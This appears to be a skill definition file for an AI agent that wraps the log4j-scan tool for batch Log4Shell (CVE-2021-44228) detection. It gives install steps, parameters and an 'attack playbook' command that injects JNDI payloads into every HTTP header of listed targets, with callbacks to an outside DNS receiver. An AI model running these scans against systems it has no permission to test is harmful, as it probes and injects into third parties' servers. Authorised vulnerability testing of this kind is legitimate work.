---
name: log4j-scan-cve
description: "log4j-scan: Batch validate Log4Shell. Signals: vulnerability intelligence, CVE, self-hosted DNS receiver, timeout."
zh-signals: "log4j-scan: Log4Shell 批量验证。信号:漏洞情报,cve,自建 DNS 接收,超时。"
when-to-use: >-
  Use when validating Log4Shell (CVE-2021-44228) exposure across many web
  targets and you can provide a DNS or out-of-band callback receiver.
---

# log4j-scan

- Attack Category: C06 Targeted CVE Exploitation
- Upstream Repository: https://github.com/fullhunt/log4j-scan
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/fullhunt/log4j-scan && cd log4j-scan && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python log4j-scan.py -u https://t.com` | Log4Shell CVE-2021-44228 scan |
| `-l urls.txt` | Batch |
| `--run-all-tests` | Test all headers/parameters |
| `--custom-dns-callback vps.t.com` | Self-hosted DNS receiver |
| `-w 20` | Timeout |

## Attack Scenario Playbook

### Batch Log4Shell validation

```bash
python log4j-scan.py -l targets.txt --custom-dns-callback x.dnslog.cn
# Inject the JNDI payload into every HTTP header and common parameter
```

## Notes

By FullHunt; exhaustive Log4Shell detection (all headers, all parameters, multiple protocols) with self-hosted OOB support.
